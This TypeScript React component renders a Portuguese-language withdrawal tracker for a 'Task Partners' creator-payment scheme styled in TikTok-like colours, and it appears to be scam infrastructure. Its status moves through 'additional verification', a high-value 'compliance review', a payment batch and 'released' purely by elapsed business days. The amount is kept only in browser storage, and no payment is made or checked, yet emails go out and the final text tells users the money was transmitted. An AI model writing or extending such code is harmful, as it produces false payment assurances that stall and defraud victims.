import { useEffect, useRef, useState } from "react";

export type PipelineUser = { name: string; email: string };

export type WithdrawalState = {
  amount: number;
  emailsSent: string[];
  method: string;
  micro1: string;
  micro2: string;
  reference: string;
  requestedAt: string;
  stage: number;
  stageStartedAt: string;
  stageActivated?: boolean;
  tasks: Record<string, boolean>;
};

type WithdrawalStage = {
  id: "verification" | "compliance" | "batch" | "released";
  days: number;
  email: "withdrawal_verification" | "withdrawal_compliance" | "withdrawal_batch" | "withdrawal_scheduled";
  label: string;
  badge: string;
  headline: string;
  text: string;
  processing: string;
  pending: string;
};

export const WITHDRAWAL_STAGES: WithdrawalStage[] = [
  {
    id: "verification",
    days: 5,
    email: "withdrawal_verification",
    label: "Verificação adicional",
    badge: "Ação necessária",
    headline: "Verificação adicional em andamento",
    text: "Seu saque exige uma verificação adicional da conta. Conclua os itens pendentes abaixo para que nossa equipe valide sua conta. A verificação é concluída em até 5 dias úteis após a solicitação.",
    processing:
      "Seu saque está sendo processado. Nossa equipe está validando os dados da conta e a titularidade vinculada ao pagamento, e essa etapa pode levar até 5 dias úteis. Você não precisa enviar a solicitação novamente.",
    pending:
      "A verificação adicional ainda não começou. Assim que esta etapa for aberta, nossa equipe será notificada e poderá levar até 5 dias úteis para validar os dados da conta.",
  },
  {
    id: "compliance",
    days: 7,
    email: "withdrawal_compliance",
    label: "Análise de conformidade",
    badge: "Revisão reforçada",
    headline: "Sua conta está em análise reforçada devido ao valor do saque",
    text: "Saques de alto valor passam por uma análise reforçada antes da aprovação. Confirme a origem dos valores abaixo. Essa revisão é concluída em até 7 dias úteis.",
    processing:
      "Seu saque está em análise de conformidade. Por causa do valor, um analista está fazendo uma verificação reforçada da conta, e essa análise pode levar até 7 dias úteis. Seu saldo permanece reservado para este saque durante a revisão.",
    pending:
      "A análise de conformidade ainda não começou. Quando esta etapa abrir, seu caso entra na fila de análise e o prazo é de até 7 dias úteis para concluir a revisão.",
  },
  {
    id: "batch",
    days: 7,
    email: "withdrawal_batch",
    label: "Lote de pagamento",
    badge: "Aprovado",
    headline: "Seu saque foi aprovado e entrou no próximo lote de pagamento",
    text: "Os pagamentos são enviados em lotes programados. Seu valor está reservado para a próxima janela de lote, com envio em até 7 dias úteis. Nenhuma ação adicional é necessária.",
    processing:
      "Seu saque foi aprovado e está na fila do próximo lote de pagamento. Os pagamentos são enviados em janelas programadas, e o envio ao provedor pode levar até 7 dias úteis. Nenhuma ação adicional é necessária.",
    pending:
      "Seu lote de pagamento ainda não foi agendado. Quando esta etapa abrir, seu saque será colocado na próxima janela de lote, com prazo de até 7 dias úteis para transmissão.",
  },
  {
    id: "released",
    days: 0,
    email: "withdrawal_scheduled",
    label: "Liberado",
    badge: "Liberado",
    headline: "Saque liberado para sua conta",
    text: "Seu lote de pagamento foi transmitido. Dependendo do provedor, o crédito aparece em até 1 a 3 dias úteis.",
    processing:
      "Seu saque foi liberado. O lote com este pagamento foi enviado ao seu provedor e, dependendo do banco ou carteira, o crédito aparece em até 1 a 3 dias úteis.",
    pending: "",
  },
];


const WITHDRAWAL_STATE_PREFIX = "ttp_withdrawal_state:";

export function withdrawalStateKey(email: string) {
  return `${WITHDRAWAL_STATE_PREFIX}${email.toLowerCase()}`;
}

export function readWithdrawalState(email: string): WithdrawalState | null {
  try {
    const raw = window.localStorage.getItem(withdrawalStateKey(email));
    if (!raw) return null;
    const parsed = JSON.parse(raw) as WithdrawalState;
    if (typeof parsed?.stage !== "number") return null;
    return { ...parsed, emailsSent: parsed.emailsSent ?? [], tasks: parsed.tasks ?? {} };
  } catch {
    return null;
  }
}

export function writeWithdrawalState(email: string, state: WithdrawalState) {
  try {
    window.localStorage.setItem(withdrawalStateKey(email), JSON.stringify(state));
  } catch {
    /* storage unavailable */
  }
}

export function buildWithdrawalReference(email: string) {
  const seed = Math.abs(Array.from(email).reduce((total, char) => (total * 31 + char.charCodeAt(0)) % 999983, 7)) % 100000;
  const stamp = Date.now().toString(36).toUpperCase().slice(-5);
  return `TP-${String(seed).padStart(5, "0")}-${stamp}`;
}

function isWeekend(date: Date) {
  const day = date.getDay();
  return day === 0 || day === 6;
}

export function addBusinessDays(from: Date, businessDays: number) {
  const cursor = new Date(from.getTime());
  let left = businessDays;
  while (left > 0) {
    cursor.setDate(cursor.getDate() + 1);
    if (!isWeekend(cursor)) left -= 1;
  }
  return cursor;
}

export function businessDaysBetween(from: number, to: number) {
  if (to <= from) return 0;
  const cursor = new Date(from);
  let count = 0;
  while (cursor.getTime() < to) {
    cursor.setDate(cursor.getDate() + 1);
    if (!isWeekend(cursor) && cursor.getTime() <= to) count += 1;
  }
  return count;
}

export function stageEndsAt(state: WithdrawalState) {
  const stage = WITHDRAWAL_STAGES[Math.min(state.stage, WITHDRAWAL_STAGES.length - 1)];
  const start = new Date(state.stageStartedAt);
  if (stage.days <= 0) return start.getTime();
  return addBusinessDays(start, stage.days).getTime();
}

function scheduledStageStarts(requestedAt: string) {
  const requested = new Date(requestedAt);
  const verification = requested;
  const compliance = addBusinessDays(verification, WITHDRAWAL_STAGES[0].days);
  const batch = addBusinessDays(compliance, WITHDRAWAL_STAGES[1].days);
  const released = addBusinessDays(batch, WITHDRAWAL_STAGES[2].days);
  return [verification, compliance, batch, released];
}

function scheduledStageAt(requestedAt: string, now: number) {
  const starts = scheduledStageStarts(requestedAt);
  let stage = 0;
  for (let index = 1; index < starts.length; index += 1) {
    if (starts[index].getTime() <= now) stage = index;
  }
  return { stage, starts };
}


export async function sendWithdrawalEmail(user: PipelineUser, template: string, state: WithdrawalState, scheduledAt?: Date) {
  try {
    const response = await fetch("/api/public/send-access-email", {
      body: JSON.stringify({
        amount: state.amount,
        balance: state.amount,
        email: user.email,
        name: user.name,
        reference: state.reference,
        scheduledAt: scheduledAt?.toISOString(),
        template,
      }),
      headers: { "Content-Type": "application/json" },
      method: "POST",
    });
    if (!response.ok) {
      console.warn("[Task Partners] withdrawal email failed", response.status, await response.text());
      return false;
    }
    return true;
  } catch (error) {
    console.warn("[Task Partners] withdrawal email failed", error);
    return false;
  }
}

function money(value: number) {
  return value.toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
}

function longDate(date: Date) {
  return date.toLocaleDateString("pt-BR", { day: "numeric", month: "long", year: "numeric" });
}

export function WithdrawalTracker(props: {
  state: WithdrawalState;
  user: PipelineUser;
  onChange: (next: WithdrawalState) => void;
}) {
  const { state, user, onChange } = props;
  const [now, setNow] = useState(() => Date.now());
  const syncingEmails = useRef(false);
  const schedule = scheduledStageAt(state.requestedAt, now);
  const stageIndex = Math.max(Math.min(state.stage, WITHDRAWAL_STAGES.length - 1), schedule.stage);
  const stage = WITHDRAWAL_STAGES[stageIndex];
  const isFinal = stage.id === "released";
  const stageStartedAt = schedule.starts[stageIndex];
  const nextStageAt = schedule.starts[stageIndex + 1];
  const endsAt = nextStageAt?.getTime() ?? stageStartedAt.getTime();
  const remaining = Math.max(0, endsAt - now);

  const startedAt = stageStartedAt.getTime();
  const progressPct = isFinal ? 100 : Math.min(100, Math.max(4, ((now - startedAt) / Math.max(1, endsAt - startedAt)) * 100));

  useEffect(() => {
    const timer = window.setInterval(() => setNow(Date.now()), 60000);
    return () => window.clearInterval(timer);
  }, []);


  useEffect(() => {
    if (syncingEmails.current) return;
    const requestedWasPreviouslySent = state.emailsSent.some((key) => key.startsWith("stage_"));
    const scheduledEmails = [
      { key: "withdrawal_requested", template: "withdrawal_requested", scheduledAt: schedule.starts[0] },
      ...WITHDRAWAL_STAGES.map((item, index) => ({
        key: `stage_${item.id}`,
        scheduledAt: schedule.starts[index],
        template: item.email,
      })),
    ].filter((item) => {
      if (state.emailsSent.includes(item.key)) return false;
      if (item.key === "withdrawal_requested" && requestedWasPreviouslySent) return false;
      return true;
    });
    const stageChanged = state.stage !== schedule.stage || state.stageStartedAt !== stageStartedAt.toISOString() || state.stageActivated === false;
    if (!scheduledEmails.length && !stageChanged) return;

    syncingEmails.current = true;
    void (async () => {
      const emailsSent = [...state.emailsSent];
      if (requestedWasPreviouslySent && !emailsSent.includes("withdrawal_requested")) emailsSent.push("withdrawal_requested");
      for (const item of scheduledEmails) {
        const scheduledAt = item.scheduledAt.getTime() > Date.now() ? item.scheduledAt : undefined;
        const sent = await sendWithdrawalEmail(user, item.template, state, scheduledAt);
        if (sent && !emailsSent.includes(item.key)) emailsSent.push(item.key);
      }
      onChange({
        ...state,
        emailsSent,
        stage: schedule.stage,
        stageActivated: true,
        stageStartedAt: stageStartedAt.toISOString(),
      });
      syncingEmails.current = false;
    })();
  }, [onChange, schedule.stage, stageStartedAt, state, user]);

  return (
    <div>
      <h1 className="mb-4 text-2xl font-black text-[#0F172A]">Status do saque</h1>

      <section className="overflow-hidden rounded-[14px] bg-[#010101] p-5 text-white shadow-[0_18px_40px_rgba(1,1,1,.25)]">
        <div className="flex items-start justify-between gap-3">
          <div className="min-w-0">
            <p className="text-[10px] font-black uppercase tracking-[0.18em] text-[#25F4EE]">Pagamentos de Criadores</p>
            <p className="mt-1 text-[32px] font-black leading-none">{money(state.amount)}</p>
            <p className="mt-2 truncate text-[11px] font-bold text-white/60">Ref {state.reference} · {state.method}</p>
          </div>
          <span className="shrink-0 rounded-full bg-[#FE2C55] px-3 py-1 text-[10px] font-black uppercase tracking-[0.12em]">{stage.badge}</span>
        </div>

        <div className="mt-5 rounded-[10px] border border-white/10 bg-white/[0.06] p-4">
          <p className="text-[10px] font-black uppercase tracking-[0.16em] text-white/50">Etapa atual</p>
          <p className="mt-1 text-lg font-black">{stage.label}</p>
          {isFinal ? (
            <p className="mt-2 text-sm font-bold leading-6 text-white/70">{stage.processing}</p>
          ) : (
            <>
              <p className="mt-2 text-sm font-bold leading-6 text-white/75">{stage.processing}</p>
              <div className="mt-3 h-2 overflow-hidden rounded-full bg-white/10">
                <div className="h-full rounded-full bg-gradient-to-r from-[#25F4EE] to-[#FE2C55]" style={{ width: `${progressPct}%` }} />
              </div>
            </>
          )}
        </div>

      </section>

      <section className="mt-4 rounded-[8px] border border-slate-200 bg-white p-5 shadow-sm">
        <h2 className="text-lg font-black leading-6 text-[#0F172A]">{stage.headline}</h2>
        <p className="mt-2 text-sm font-semibold leading-6 text-[#475569]">{stage.text}</p>




        {stage.id === "released" && (
          <div className="mt-4 space-y-3 rounded-[8px] bg-[#F8FAFC] p-4 text-sm">
            <TrackerLine label="Valor liberado" value={money(state.amount)} />
            <TrackerLine label="Destino" value={state.method} />
            <TrackerLine label="Liberado em" value={longDate(new Date(state.stageStartedAt))} />
          </div>
        )}

        <p className="mt-5 text-[11px] font-bold leading-5 text-[#94A3B8]">
          Solicitado em {longDate(new Date(state.requestedAt))} · Referência {state.reference}. As atualizações de status também são enviadas para o seu e-mail em cada etapa.
        </p>
      </section>
    </div>
  );
}

function TrackerLine({ label, value }: { label: string; value: string }) {
  return (
    <div className="flex items-center justify-between gap-3">
      <span className="text-xs font-bold text-[#64748B]">{label}</span>
      <span className="text-sm font-black text-[#0F172A]">{value}</span>
    </div>
  );
}
